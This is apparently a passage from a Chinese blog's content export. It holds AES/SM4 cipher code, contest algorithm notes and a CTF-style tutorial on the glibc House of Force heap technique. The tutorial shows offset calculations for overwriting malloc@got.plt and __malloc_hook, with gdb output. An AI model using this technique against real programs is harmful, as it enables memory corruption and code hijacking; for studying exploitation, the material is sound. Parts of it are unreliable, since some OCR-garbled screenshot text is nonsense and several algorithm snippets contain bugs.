w[4]={0};\n    for(int k=0; k&lt;4; k++)\n        w[k] = key[4*round+k];  //密钥赋值\n    for(int i=0; i&lt;16; i++)\n        m[i] = c[i];\n    AddRoundKey(m,w);\n    //接下来是9轮一摸一样的函数\n    for(int i = 1;i&lt;=9;i++)\n    {\n        InvShiftRows(m);//行移位\n        InvSubBytes(m,16);//字节替代\n        round--;\n        //cout&lt;&lt;\"轮数\"&lt;&lt;round&lt;&lt;endl;\n        for(int k=0; k&lt;4; k++) {\n            w[k] = key[4 * round + k];\n        }\n        AddRoundKey(m,w);//轮密钥加\n        InvMixColumns(m);//列混淆\n    }\n    //最后一轮\n    round--;\n    //cout&lt;&lt;\"轮数\"&lt;&lt;round&lt;&lt;endl;\n    for(int k=0; k&lt;4; k++) {\n        w[k] = key[4 * round + k];\n        //(\"%x \",w[k]);\n    }\n    InvShiftRows(m);//行移位\n    InvSubBytes(m,16);//字节替代\n    AddRoundKey(m,w);//轮密钥加\n}\nvoid Display(uint8_t Matrix[])\n{\n    for(int i=0; i&lt;16; i++) {\n        printf(\"%x \", Matrix[i]);\n        if(i%4==3)\n            cout&lt;&lt;endl;\n    }\n}\nvoid DisplayKeys(uint32_t Matrix[])\n{\n    for(int i=0; i&lt;44; i++) {\n        printf(\"第%d列:%x\\n\",i,Matrix[i]);\n    }\n}\nint main()\n{\n    string mingwen;\n    string miwen;\n    uint8_t key[16]={0};\n    uint8_t m[16]={0};\n    cout&lt;&lt;\"请输入明文(128bits):\";\n    cin&gt;&gt;mingwen;\n    cout&lt;&lt;\"请输入密文(128bits):\";\n    cin&gt;&gt;miwen;\n    for(int i=0;i&lt;16;i++)\n    {\n        m[i] = (uint8_t)(mingwen[i]);\n        key[i] = (uint8_t)(miwen[i]);\n    }\n    uint8_t c[16]={0};\n    uint8_t x[16]={0};\n    uint32_t new_key[44]={0};   //存储44列密钥\n    cout&lt;&lt;\"明文:\"&lt;&lt;endl;\n    Display(m);\n    cout&lt;&lt;\"密钥:\"&lt;&lt;endl;\n    Display(key);\n    get_TAB();//生成列混淆表\n    KeyExpansion(key,new_key);\n    cout&lt;&lt;\"生成密钥\"&lt;&lt;endl;\n    //DisplayKeys(new_key);\n    Encrypt(m,new_key,c);\n    cout&lt;&lt;\"加密结果\"&lt;&lt;endl;\n    Display(c);\n    Decrypt(c,new_key,x);\n    cout&lt;&lt;\"解密结果(hex)\"&lt;&lt;endl;\n    Display(x);\n    cout&lt;&lt;\"解密结果(string)\"&lt;&lt;endl;\n    for(int i=0;i&lt;16;i++)\n        cout&lt;&lt;(char)x[i];\n    return 0;\n}\n\nSM4\n#include \"string.h\"\n#include&lt;iostream&gt;\n#include &lt;stdint.h&gt;\n#include&lt;string&gt;\nusing namespace std;\nuint32_t shift_l(uint32_t s,int n)//循环左移n位\n{\n    int size=sizeof (s)*8;      //字节数乘以8代表一共多少位\n    return s&lt;&lt;(n)|(s&gt;&gt;size-n);\n}\nuint32_t Sb(uint32_t s) {\n\n    uint8_t SboxTable[16][16] =\n            {\n                    {0xd6, 0x90, 0xe9, 0xfe, 0xcc, 0xe1, 0x3d, 0xb7, 0x16, 0xb6, 0x14, 0xc2, 0x28, 0xfb, 0x2c, 0x05},\n                    {0x2b, 0x67, 0x9a, 0x76, 0x2a, 0xbe, 0x04, 0xc3, 0xaa, 0x44, 0x13, 0x26, 0x49, 0x86, 0x06, 0x99},\n                    {0x9c, 0x42, 0x50, 0xf4, 0x91, 0xef, 0x98, 0x7a, 0x33, 0x54, 0x0b, 0x43, 0xed, 0xcf, 0xac, 0x62},\n                    {0xe4, 0xb3, 0x1c, 0xa9, 0xc9, 0x08, 0xe8, 0x95, 0x80, 0xdf, 0x94, 0xfa, 0x75, 0x8f, 0x3f, 0xa6},\n                    {0x47, 0x07, 0xa7, 0xfc, 0xf3, 0x73, 0x17, 0xba, 0x83, 0x59, 0x3c, 0x19, 0xe6, 0x85, 0x4f, 0xa8},\n                    {0x68, 0x6b, 0x81, 0xb2, 0x71, 0x64, 0xda, 0x8b, 0xf8, 0xeb, 0x0f, 0x4b, 0x70, 0x56, 0x9d, 0x35},\n                    {0x1e, 0x24, 0x0e, 0x5e, 0x63, 0x58, 0xd1, 0xa2, 0x25, 0x22, 0x7c, 0x3b, 0x01, 0x21, 0x78, 0x87},\n                    {0xd4, 0x00, 0x46, 0x57, 0x9f, 0xd3, 0x27, 0x52, 0x4c, 0x36, 0x02, 0xe7, 0xa0, 0xc4, 0xc8, 0x9e},\n                    {0xea, 0xbf, 0x8a, 0xd2, 0x40, 0xc7, 0x38, 0xb5, 0xa3, 0xf7, 0xf2, 0xce, 0xf9, 0x61, 0x15, 0xa1},\n                    {0xe0, 0xae, 0x5d, 0xa4, 0x9b, 0x34, 0x1a, 0x55, 0xad, 0x93, 0x32, 0x30, 0xf5, 0x8c, 0xb1, 0xe3},\n                    {0x1d, 0xf6, 0xe2, 0x2e, 0x82, 0x66, 0xca, 0x60, 0xc0, 0x29, 0x23, 0xab, 0x0d, 0x53, 0x4e, 0x6f},\n                    {0xd5, 0xdb, 0x37, 0x45, 0xde, 0xfd, 0x8e, 0x2f, 0x03, 0xff, 0x6a, 0x72, 0x6d, 0x6c, 0x5b, 0x51},\n                    {0x8d, 0x1b, 0xaf, 0x92, 0xbb, 0xdd, 0xbc, 0x7f, 0x11, 0xd9, 0x5c, 0x41, 0x1f, 0x10, 0x5a, 0xd8},\n                    {0x0a, 0xc1, 0x31, 0x88, 0xa5, 0xcd, 0x7b, 0xbd, 0x2d, 0x74, 0xd0, 0x12, 0xb8, 0xe5, 0xb4, 0xb0},\n                    {0x89, 0x69, 0x97, 0x4a, 0x0c, 0x96, 0x77, 0x7e, 0x65, 0xb9, 0xf1, 0x09, 0xc5, 0x6e, 0xc6, 0x84},\n                    {0x18, 0xf0, 0x7d, 0xec, 0x3a, 0xdc, 0x4d, 0x20, 0x79, 0xee, 0x5f, 0x3e, 0xd7, 0xcb, 0x39, 0x48}};\n    uint8_t a[4];\n    a[0]=(s&gt;&gt;24)&amp;0xff;     //最高8位\n    a[1]=(s&gt;&gt;16)&amp;0xff;\n    a[2]=(s&gt;&gt;8)&amp;0xff;\n    a[3]=s&amp;0xff;\n    uint8_t b[4];\n    for(int i=0;i&lt;4;i++) {\n        int row = ((a[i] &gt;&gt; 7) &amp; 1) * 8 + ((a[i] &gt;&gt; 6) &amp; 1) * 4 + ((a[i] &gt;&gt; 5) &amp; 1) * 2 + ((a[i] &gt;&gt; 4) &amp; 1) * 1;\n        int col = ((a[i] &gt;&gt; 3) &amp; 1) * 8 + ((a[i] &gt;&gt; 2) &amp; 1) * 4 + ((a[i] &gt;&gt; 1) &amp; 1) * 2 + ((a[i]) &amp; 1) * 1;\n        b[i] = SboxTable[row][col];\n    }\n    uint32_t result;\n    result=(b[0]&lt;&lt;24)|(b[1]&lt;&lt;16)|(b[2]&lt;&lt;8)|b[3];\n    return result;\n}\n\nuint32_t L_change(uint32_t s)\n{\n    return s^ shift_l(s,13)^ shift_l(s,23);\n}\n\nuint32_t T_change(uint32_t s)\n{\n    return L_change(Sb(s));\n}\n\nvoid keyexpand(uint32_t MK[4],uint32_t rk[32])\n{\n    uint32_t FK[4]={0xA3B1BAC6, 0x56AA3350,0x677D9197, 0xB27022DC};\n    uint32_t CK[32] = { 0x00070E15, 0x1C232A31, 0x383F464D, 0x545B6269,\n                        0x70777E85, 0x8C939AA1, 0xA8AFB6BD, 0xC4CBD2D9,\n                        0xE0E7EEF5, 0xFC030A11, 0x181F262D, 0x343B4249,\n                        0x50575E65, 0x6C737A81, 0x888F969D, 0xA4ABB2B9,\n                        0xC0C7CED5, 0xDCE3EAF1, 0xF8FF060D, 0x141B2229,\n                        0x30373E45, 0x4C535A61, 0x686F767D, 0x848B9299,\n                        0xA0A7AEB5, 0xBCC3CAD1, 0xD8DFE6ED, 0xF4FB0209,\n                        0x10171E25, 0x2C333A41, 0x484F565D, 0x646B7279 };\n    uint32_t k[4]={MK[0]^FK[0],MK[1]^FK[1],MK[2]^FK[2],MK[3]^FK[3]};\n    uint32_t K[36];\n    for(int i=0;i&lt;=3;i++)\n        K[i]=k[i];\n    for(int i=0;i&lt;32;i++)\n    {\n        K[i+4]=K[i]^ T_change(K[i+1]^K[i+2]^K[i+3]^CK[i]);\n    }\n    for(int i=0;i&lt;32;i++)\n        rk[i]=K[i+4];\n\n}\n\nuint32_t Lchange(uint32_t s)\n{\n    return s^shift_l(s,2)^shift_l(s,10)^shift_l(s,18)^shift_l(s,24);\n}\n\nuint32_t Tchange(uint32_t s)\n{\n    return Lchange(Sb(s));\n}\n\nuint32_t fround(uint32_t X[4],uint32_t rk)\n{\n    uint32_t B=X[1]^X[2]^X[3]^rk;\n    return X[0]^ L_change(Sb(B));\n}\n\nstatic uint32_t out1[4];\n\nvoid SM4(uint32_t X[4],uint32_t rk[32])\n{\n    uint32_t Y[36];\n    Y[0]=X[0];\n    Y[1]=X[1];\n    Y[2]=X[2];\n    Y[3]=X[3];\n    for(int i=0;i&lt;=31;i++) {\n        Y[i + 4] = Y[i] ^ Tchange(Y[i + 1] ^ Y[i + 2] ^ Y[i + 3] ^ rk[i]);\n    }\n//    for(int i=0;i&lt;36;i++) {\n//        printf(\"第%d轮:%x \\n\",i,Y[i]);\n//    }\n    out1[0]=Y[35];\n    out1[1]=Y[34];\n    out1[2]=Y[33];\n    out1[3]=Y[32];\n}\n\nstatic uint32_t out2[4];\n\nvoid sm4(uint32_t Y[4],uint32_t rk[32])\n{\n    uint32_t X[36];\n    X[35]=Y[0];\n    X[34]=Y[1];\n    X[33]=Y[2];\n    X[32]=Y[3];\n    for(int i=31;i&gt;=0;i--)\n    {\n        X[i]=X[i+4]^ Tchange(X[i+3]^X[i+2]^X[i+1]^rk[i]);\n    }\n    out2[0]=X[0];\n    out2[1]=X[1];\n    out2[2]=X[2];\n    out2[3]=X[3];\n}\nint main() {\n    uint32_t ming[4]={0x01234567,0x89ABCDEF,0xFEDCBA98,0x76543210};\n    cout&lt;&lt;\"明文:\"&lt;&lt;endl;\n    for(int i=0;i&lt;4;i++)\n        cout&lt;&lt;hex&lt;&lt;ming[i]&lt;&lt;\" \";\n    cout&lt;&lt;endl;\n    uint32_t MK[4]={0x01234567,0x89ABCDEF,0xFEDCBA98,0x76543210};\n    cout&lt;&lt;\"密钥：\"&lt;&lt;endl;\n    for(int i=0;i&lt;4;i++)\n        cout&lt;&lt;hex&lt;&lt;MK[i]&lt;&lt;\" \";\n    cout&lt;&lt;endl;\n    uint32_t rk[32];\n    keyexpand(MK,rk);\n//    cout&lt;&lt;\"扩展密钥：\"&lt;&lt;endl;\n//    for(int i=0;i&lt;32;i++)\n//        cout&lt;&lt;i&lt;&lt;\"轮扩展密钥\"&lt;&lt;rk[i]&lt;&lt;endl;\n    cout&lt;&lt;\"加密结果：\"&lt;&lt;endl;\n    SM4(ming,rk);\n    for(int i=0;i&lt;4;i++)\n        cout&lt;&lt;out1[i]&lt;&lt;\" \";\n    cout&lt;&lt;endl;\n    cout&lt;&lt;\"解密结果:\"&lt;&lt;endl;\n    sm4(out1,rk);\n    for(int i=0;i&lt;4;i++)\n        cout&lt;&lt;out2[i]&lt;&lt;\" \";\n    cout&lt;&lt;endl;\n    return 0;\n}\n\n\n","tags":["密码学实验代码集合"]},{"title":"蓝桥杯","url":"/2023/04/10/%E8%93%9D%E6%A1%A5%E6%9D%AF%E5%88%B7%E9%A2%98%E6%80%BB%E7%BB%93/","content":"\n救赎\n基础知识\n1.欧几里得辗转相除法 求解 最大公约数 最小公倍数\nint gcd(int a, int b){return b == 0 ? a : gcd(b, a % b);}\nint lcm(int a, int b){return a / gcd(a, b) * b;}\n\n2.求质数\n/* 判断素数 */\nbool isPrime(LL n) {\n\tfor (int i = 2; i * i &lt;= n; ++i)\n\t\tif (n % i == 0)\n\t\t\treturn false;\n\treturn true;\n}\n\n3.栈\n#include &lt;stack&gt;\nstack&lt;类型&gt; mystack;\ns.empty();         //如果栈为空则返回true, 否则返回false;\ns.size();          //返回栈中元素的个数\ns.top();           //返回栈顶元素, 但不删除该元素\ns.pop();           //弹出栈顶元素, 但不返回其值\ns.push();          //将元素压入栈顶\n\n4.队列\n#include &lt;queue&gt;\nqueue&lt;类型&gt; myqueue;\npush() //在队尾插入一个元素\npop() //删除队列第一个元素\nsize() //返回队列中元素个数\nempty() //如果队列空则返回true\nfront() //返回队列中的第一个元素\nback() //返回队列中最后一个元素\n\n5.DFS(深度优先)\nint dx[4] = {0,0,-1,1};\nint dy[4] = {-1,1,0,0};\nint mp[N][N];//存放迷宫\nint vis[N][N];//表示是否访问过，初始为flase\nvoid DFS(int x, int y)\t//x,y是坐标点的位置 \n{\n\tif(vis[x][y] || (x==n &amp;&amp; y==n)) return; //表示已经访问过了或者到达终点,递归的出口\n\tvis[x][y] = true; //表示没有访问过，现在正在访问，置为访问过\n\tfor(int i=0; i &lt; 4; i++){\t//遍历四个方向，顺序依次是，上下左右\n\t\tint nx = x + dx[i];\n\t\tint ny = y + dy[i];\n      //进行了合法性检验，\n      //1.首先判断了该点是否越界，即是否在迷宫内  nx &gt; 0 &amp;&amp; nx &lt;= n &amp;&amp; ny &gt; 0 &amp;&amp; ny &lt;= n\n      //2.然后判断是否访问过  !vis[nx][ny] 未访问过就继续\n      //3.最后判断是否为路  mp[nx][ny] == '0' 为路就继续\n\t\tif(nx &gt; 0 &amp;&amp; nx &lt;= n &amp;&amp; ny &gt; 0 &amp;&amp; ny &lt;= n &amp;&amp; !vis[nx][ny] &amp;&amp; mp[nx][ny] == '0')\n\t\t\tdfs(nx,ny);\n\t} \n}\n//注意!! 应该判断一下起点是否可走\n\n6.BFS(广度优先搜索)\nint X[4]={0, 0, -1, 1};\nint Y[4]={-1, 1, 0, 0};\nint matrix[N][N]; //存储迷宫信息\nint vis[N][N];\t//存储每个状态点是否走过\n\nstruct node{\n\tint x;\n\tint y;\n}Node, top;\n\nbool judge(int xx, int yy)\n{\n\tif(xx&lt;0||yy&lt;0||xx&gt;=N||yy&gt;=N) //注意边界\n\t\treturn false;\n\tif(vis[xx][yy]==true||matrix[xx][yy]==0)\t//下一个点走过或者为墙 0不能走，1能走\n\t\treturn false;\n\treturn true;\n}\n\n\nvoid BFS(int x, int y)\n{\n\tqueue&lt;node&gt; q;\n\tNode.x=x;\n\tNode.y=y;\n\tq.push(Node);\t//将起点入队列\n\twhile(!q.empty())\t//队列不空就扩散\n\t{\n\t\ttop=q.front();\t//取出队首元素\n\t\tint nx=top.x;\n\t\tint ny=top.y;\t//从四个方面机进行扩散\n         if(nx == ex &amp;&amp; ny == ey) //找到终点\n             return top;\n\t\tfor(int i=0; i&lt;4; i++)\n\t\t{\n\t\t\tif(judge(nx+X[i], ny+Y[i])) //检查四个方向，如果有路就进队列\n\t\t\t{\n\t\t\t\tNode.x=nx+X[i];\n\t\t\t\tNode.y=ny+Y[i];\n\t\t\t\tq.push(Node);\t\n\t\t\t}\n\t\t}\n\t\tans++;\t//计数器\n\t\tvis[nx][ny]=true;\n\t\tq.pop();\t//表示这个点的邻接点已经全部入队列，丢弃这个点\n\t}\n}\n\n7.二分模板\n/*\n    作者:FengBOOOOOOOOOOOOOOO\n    二分模板返回大于x的第一个位置    \n*/\n#include&lt;cstdio&gt;\n#include&lt;algorithm&gt;\n#include&lt;cstring&gt;\n#define N 1005\nusing namespace std;\n\nint a[N],n,q;\n\nint find(int l,int r,int key)//l为-1，r为数组长度\n{\n    while(l + 1 &lt; r)\n    {\n        int mid = l + r&gt;&gt;1;\n        if(a[mid] &lt;= key)\n        　　l = mid;\n        else\n        　　r = mid;\n    }\n    return r;//返回大于Key的第一个位置\n}\n\nint main()\n{\n    int k;\n    scanf(\"%d%d\",&amp;n,&amp;q);\n    for(int i = 0; i &lt; n; ++i)\n    　　scanf(\"%d\",&amp;a[i]);\n    for(int i = 0; i &lt; q; ++i)\n    {\n        scanf(\"%d\",&amp;k);\n        printf(\"%d\\n\",find(-1,n,k));\n    }\n} \n\n\n最短路径问题\n1.SPFA最短路径(类似与BFS)\n#include &lt;iostream&gt;\n#include &lt;string.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;algorithm&gt;\n#include &lt;queue&gt;\n#include &lt;vector&gt;\n#define ll long long\n#define inf 0x3f3f3f3f\n#define pii pair&lt;int, int&gt;\nconst int mod = 1e9+7;\nconst int maxn = 2e5+7;\nusing namespace std;\nstruct node {int to,w,next;} edge[maxn];\nint head[maxn], cnt;\nint dis[maxn], vis[maxn];\nint n, m, s, t;\nstruct Spfa\n{\n    void init()\n    {\n        memset(head,-1,sizeof(head));\n        memset(dis,0x3f3f3f3f,sizeof(dis));\n        memset(vis,0,sizeof(vis));\n        cnt = 0;\n    }\n \n    void add(int u,int v,int w)\n    {\n        edge[cnt].to = v;\n        edge[cnt].w = w;\n        edge[cnt].next = head[u];\n        head[u] = cnt ++;\n    }\n \n    void spfa()\n    {\n        dis[s] = 0; vis[s] = 1;\n        queue &lt;int&gt; Q; Q.push(s);\n        while(!Q.empty())\n        {\n            int now = Q.front();\n            Q.pop(); vis[now] = 0;    //从队列中弹出now , vis[now] 标记为未访问\n            for(int i = head[now]; i != -1; i = edge[i].next)\n            {\n                int v = edge[i].to;\n                if(dis[v] &lt; dis[now] + edge[i].w)\n                {\n                    dis[v] = dis[now] + edge[i].w;\n                    if(vis[v]) continue;    //如果访问过了(也就是 已经在队列中),就不用再push\n                    vis[v] = 1; Q.push(v);\n                }\n            }\n        }\n    }\n}sp;\n \nint main()\n{\n    while(~scanf(\"%d%d\",&amp;n,&amp;m) &amp;&amp; n+m)\n    {\n        sp.init();\n        for(int i = 0; i &lt; m; i++)\n        {\n            int u, v, w;\n            scanf(\"%d%d%d\",&amp;u, &amp;v, &amp;w);\n            sp.add(u, v, w);\n            sp.add(v, u, w);\n        }\n        s = 1, t = n; //s起点，t终点\n        sp.spfa();\n        printf(\"%d\\n\", dis[t]);\n    }\n}\n\n\n2.Dijkstra\n//主要思想一个大循环+两个小循环\nvoid dijkstra(){\n\tint u, minx;\n\tbook[S] = 1;\n\tfor(int i = 0; i &lt; N; i++){\n\t//dist[]数组初始化，把起始结点S到i结点的距离赋值给diat[i]\n\t\tdist[i] = v[S][i];\n\t}\n\n\tfor(int i = 0; i &lt; N; i++){//大循环\n\t\tminx = INT_MAX;\n\t\tfor(int j = 0; j &lt; N; j++){//寻找没有被标记并且最短的路径，并记录此结点 \n\t\t\tif(!book[j] &amp;&amp; minx &gt; dist[j]){\n\t\t\t\tminx = dist[j];\n\t\t\t\tu = j;\n\t\t\t} \n\t\t}\n\t\tbook[u] = 1;\n\t\tfor(int k = 0; k &lt; N; k++){\n\t\t//如果A到B的距离大于A到C的距离加C到B的距离，那么更新数据\n\t\t\tif(!book[k] &amp;&amp; dist[k] &gt; dist[u]+v[u][k]){\n\t\t\t\tdist[k] = dist[u]+v[u][k];\n\t\t\t}\n\t\t}\n\t}\n}\n\n\n3.Floyd\n//初始化：\n    for (int i = 1; i &lt;= n; i ++ )\n        for (int j = 1; j &lt;= n; j ++ )\n            if (i == j) d[i][j] = 0;\n            else d[i][j] = INF;\n\n// 算法结束后，d[a][b]表示a到b的最短距离\nvoid floyd()\n{\n    for (int k = 1; k &lt;= n; k ++ )\n        for (int i = 1; i &lt;= n; i ++ )\n            for (int j = 1; j &lt;= n; j ++ )\n                d[i][j] = min(d[i][j], d[i][k] + d[k][j]);\n}\n\n\n","tags":["蓝桥杯刷题总结"]},{"url":"/2023/09/11/House-Of-Force/","content":"PWN入门（3-12-1）-House Of Force（控制top_chunk）（基础）\n参考资料：\nCTF-wiki：https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/house_of_force-zh/\n附件下载：\n链接: https://pan.baidu.com/s/1NiEZbuBUCFJrMOjqlazPUA  密码: np57\n–来自百度网盘超级会员V3的分享\nHouse Of Force是一种堆的利用方法，其主要原理是控制heap中的top_chunk并malloc来达到控制任意内存的空间。在讲解原理之前，首先来看一个示例。\nLinux环境\nldd\n-version\nLdd(UBuntuGLIBC2.23-Oubuntu11.2)2.23\ncopyright()2016FreeSoftwareFoundation,I\nThereisNo\nThisisfree\neforcopyingconditions\nsoftware;seethesourcefor\nULARPURPOSE\nARRANtYteVFrMERCHANTABILITYORFITNESSFORAPARTICULARPU\nWrittenbyRolandMccrathandULrichrepper\nlsbrelease-a\nNoLSBmodulesareavailable.\nDistributorID:Ubuntu\nDescription:\nUbuntu16,04.7LTS\nRelease:\n16.04\ncodename:\nxenial\n\n/main_arena/lib/x86_64-linux-gnu/libe.so6\ntgit:(master)\nmain_arenaoffsetg\njLibcve\nversion:glibe2.23\ndD:BuiLdD[sh1C4FD86ECLEED579C79CE601F6C63796F574DF\nJbuitdID\nJmain_arena_offset:ox3c4b20\nmain-_arena_offsetgit:(master)Xi\n\nUbuntu版本为16.04，libc版本为2.23。\nDemo1\npwndbg\n编译命令：gcc -g -z execstack -fno-stack-protector top_chunk_demo.c -o top_chunk_demo\n编译完成之后检查一下文件的保护：\npchecksec–file-top_chunk_demo\nDesktop\n[*]\"/home/ubuntu/Desktop/top_chunk_demo\nayd64-64-Little\nArch:\nRELRO:\nPartialRELRO\nNOCanaryFOund\nstaCk:\nNXdisabled\nNX:\n(0x400000)\nPIE\nPIE:\nNo\nRWX\nRWX:\nHas\nsegmentS\nDesktop\n\n编译好之后，对其进行gdb调试。对代码的第5行下断点：\n看一下heap的状况：\n这里记下此时top_chunk的大小为0x20fe1。执行同样的步骤，让程序执行malloc(0x20);这时的heap情况如下：\n从上面的代码框可以看到，系统新开辟了一个大小为0x31的内存空间。此时的top_chunk_size减少了0x30大小。\n继续调试，让程序执行malloc(0x30);，再来看一下heap：\n此时的top_chunk减小了0x40。\n结论\n从上面可以看出，在分配比top_chunk小的chunk时，会从top_chunk中分割出要分配的chunk，并且top_chunk向下移动。\n攻击原理\n好了，看过了Demo1现在讲解House Of Force原理就应该没有问题了。\n如果一个堆漏洞要想通过House Of Force进行利用，那么必须满足以下条件：\n●能够以溢出等方式控制到top_chunk的size域\n●能够自由的控制堆分配尺寸的大小\nHouse Of Force产生的原因在于glibc对top_chunk的处理：根据分配堆块的原理我们得知，进行堆分配时，如果所有空闲的块（bin）都无法满足需求，那么就会从 top chunk 中分割出相应的大小作为堆块的空间。\n假如说 top_chunk_size 值是由用户控制的任意值时会发生什么？答案是，可以使得 top chunk 指向我们期望的任何位置，这就相当于一次任意地址写。\n然而在 glibc 中，会对用户请求的大小和 top chunk 现有的 size 进行验证：\n根据上面的源码知道，假如说top_chunk_size被篡改成很大的值，就可以很轻松的通过这个验证，这也就是前面我们所说的需要一个能够控制top_chunk_size的漏洞。若要绕过这个验证，一般的做法是将top_chunk_size改为-1，因为在进行比较的时候会将size转换为无符号数。进一步来说就是将-1转换为unsigned long中最大的数，所以无论如何可以通过验证。验证通过之后，会将top_chunk指针进行更新，接下来的堆块就会分配到这个位置。用户只要控制了这个指针就相当于控制了任意地址。与此同时，top_chunk的size也会更新。\n总结一下：如果我们想要下次在指定位置分配大小为 x 的 chunk，我们需要确保 remainder_size 不小于 x+ MINSIZE。\n向前控制内存-Demo2\n在学习完原理之后，我们通过一个简单的示例来进一步说明House Of Force的利用。\n这个例子的目标是通过HOF（House Of Force）来篡改malloc@got.plt 实现劫持程序流程。\nDemo2和之后的Demo3都会出现在我的电脑上gdb调试不出错，但是直接运行程序就会崩溃的情况，暂不清楚导致这种情况的原因。\n示例的源代码如下：\ngcc -g -z execstack -fno-stack-protector top_chunk_demo1.c -o top_chunk_demo1\n和上面的调试步骤相同，对代码的第6行下断点，然后运行程序，查看堆的情况：\n对程序第7行下断点，让程序运行ptr=(long *)(((long)ptr)+24);\n相同的步骤，让程序继续执行*ptr=-1;：\n从上面的代码框中可以看出top_chunk_size已经被改成了0xffffffffffffffff，在真正的题目中，这一步可以通过堆溢出等漏洞来实现。 因为 -1 在补码中是以 0xffffffffffffffff 表示的，所以我们直接赋值 -1 就可以。\n还记得我们的目标吗？通过HOF（House Of Force）来篡改malloc@got.plt 实现劫持程序流程。\n接下来程序就开始执行malloc(-4120);了，有个疑问，-4120这个数字是怎么来的？\n由于我们的目标是malloc@got.plt，因此将程序拖入IDA中：\ngot.p1t000000000060101wor11\nxREF:sub4003F0+6t\nDATA\nlibcstart\ndaoffset\ngotp0000000000001\nmain\ngot.p1t:0000000000601018\n1ibcstart_maint\nDATAXREF:\ngot.p000000000060102102\ndgoffset\nma11oc\nDATAXREF:\nmalloct\ngot.p1t:0000000000601020\nends\ngotP1+\ngot.p1t:0000000000601020\nDAta:0000000000601028\nDATA:Q000000000601028\ndata\nPUKe\ndata:0000000000601028\ntype\nSegment\n\n从IDA中可以看到malloc@got.plt所在的地址为0x601020:\n所以我们应该将 top_chunk 指向0x601010处，这样当下次再分配chunk时，就可以分配到malloc@got.plt处的内存了。\n根据前面描述top_chunk位于0x602020，所以我们可以计算偏移0x601010-0x602020=-4112。\n此外，用户申请的内存大小，一旦进入申请内存的函数中就变成了无符号整数：\n输入的大小后需要经过checked_request2size函数：\n一方面，我们需要绕过 REQUEST_OUT_OF_RANGE(req) 这个检测，即我们传给 malloc 的值在负数范围内，不得大于 -2 * MINSIZE，这个一般情况下都是可以满足的。\n另一方面，在满足对应的约束后，我们需要使得 request2size正好转换为对应的大小，也就是说，我们需要使得 ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK 恰好为 - 4112。首先，很显然，-4112 是 chunk 对齐的，那么我们只需要将其减去 SIZE_SZ和MALLOC_ALIGN_MASK 就可以得到对应的需要申请的值。其实我们这里只需要减 SIZE_SZ 就可以了，因为多减的 MALLOC_ALIGN_MASK 最后还会被对齐掉。而如果 -4112 不是 MALLOC_ALIGN 的时候，我们就需要多减一些了。当然，我们最好使得分配之后得到的 chunk 也是对齐的，因为在释放一个 chunk 的时候，会进行对齐检查。\n32 位系统中，SIZE_SZ 是 4；64 位系统中，SIZE_SZ 是 8。\nmalloc(-4112-SIZE_SZ)=malloc(-4112-8)=malloc(-4120)。\n因此，我们当调用malloc(-4120)之后，我们可以观察到 top chunk 被抬高到我们想要的位置。\n对代码的第9行下断点，执行代码malloc(-4120);：\n最后程序malloc(0x10);之后，就可以控制malloc@got.plt处的地址：\n但是需要注意的是，在被抬高的同时，malloc@got 附近的内容也会被修改。\n向后控制内存-Demo3\n在上一个示例中，我们演示了篡改top_chunk使得top_chunk指针减小来修改位于其上面 (低地址) 的 got 表中的内容。同样的，利用此方式可以修改其下面（高地址）的内容。这次同样的利用代码进行演示：\n编译命令：gcc -g -z execstack -fno-stack-protector top_chunk_demo2.c -o top_chunk_demo2\n编译完成之后，开始对其进行调试，对代码的第6行下断点，看一下堆的情况：\n对代码的第7行下断点，继续运行程序，再来看一下堆的情况：\n从上面可以看到top_chunk的size域已经被修改，让程序继续执行malloc(140737345551056);\n为什么是malloc这么一长串数字？\n这次我们的目标是__malloc_hook，我们知道__malloc_hook 是位于 libc.so 里的全局变量值，首先查看内存布局:\n可以看到heap的基址在0x602000，而libc的基址在0x7ffff7a0d000，因此我们需要通过HOF扩大top_chunk指针的值来实现对__malloc_hook的写。 首先，由pwndbg得知 __malloc_hook 的地址位于 0x7ffff7dd1b10 :\n采取计算0x7ffff7dd1b00-0x602020-0x10=140737345551056\n经过这次 malloc 之后，我们可以观察到 top_chunk 的地址被抬高到了 0x00007ffff7dd1b00：\nC\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\npwndbg&gt; info local\nptr = 0x602028\npwndbg&gt; heap\nAllocated chunk\nAddr: 0x7ffff7dd1000\nSize: 0x7ffff7fdb000\npwndbg&gt; top_chunk\nTop chunk\nAddr: 0x7ffff7dd1b00\nSize: 0x-7ffff77cfae7\npwndbg&gt; x/16gx &amp;main_arena\n0x7ffff7dd1b20 &lt;main_arena&gt;:\t0x0000000100000000\t0x0000000000000000\n0x7ffff7dd1b30 &lt;main_arena+16&gt;:\t0x0000000000000000\t0x0000000000000000\n0x7ffff7dd1b40 &lt;main_arena+32&gt;:\t0x0000000000000000\t0x0000000000000000\n0x7ffff7dd1b50 &lt;main_arena+48&gt;:\t0x0000000000000000\t0x0000000000000000\n0x7ffff7dd1b60 &lt;main_arena+64&gt;:\t0x0000000000000000\t0x0000000000000000\n0x7ffff7dd1b70 &lt;main_arena+80&gt;:\t0x0000000000000000\t0x00007ffff7dd1b00 #top_chunk\n0x7ffff7dd1b80 &lt;main_arena+96&gt;:\t0x0000000000000000\t0x00007ffff7dd1b78\n0x7ffff7dd1b90 &lt;main_arena+112&gt;:\t0x00007ffff7dd1b78\t0x00007ffff7dd1b88\npwndbg&gt; x/16gx 0x7ffff7dd1b00\n0x7ffff7dd1b00 &lt;__memalign_hook&gt;:\t0x00007ffff7a92ea0\t0xffff800008830519\n0x7ffff7dd1b10 &lt;__malloc_hook&gt;:\t0x0000000000000000\t0x0000000000000000\n0x7ffff7dd1b20 &lt;main_arena&gt;:\t0x0000000100000000\t0x0000000000000000\n0x7ffff7dd1b30 &lt;main_arena+16&gt;:\t0x0000000000000000\t0x0000000000000000\n0x7ffff7dd1b40 &lt;main_arena+32&gt;:\t0x0000000000000000\t0x0000000000000000\n0x7ffff7dd1b50 &lt;main_arena+48&gt;:\t0x0000000000000000\t0x0000000000000000\n0x7ffff7dd1b60 &lt;main_arena+64&gt;:\t0x0000000000000000\t0x0000000000000000\n0x7ffff7dd1b70 &lt;main_arena+80&gt;:\t0x0000000000000000\t0x00007ffff7dd1b00 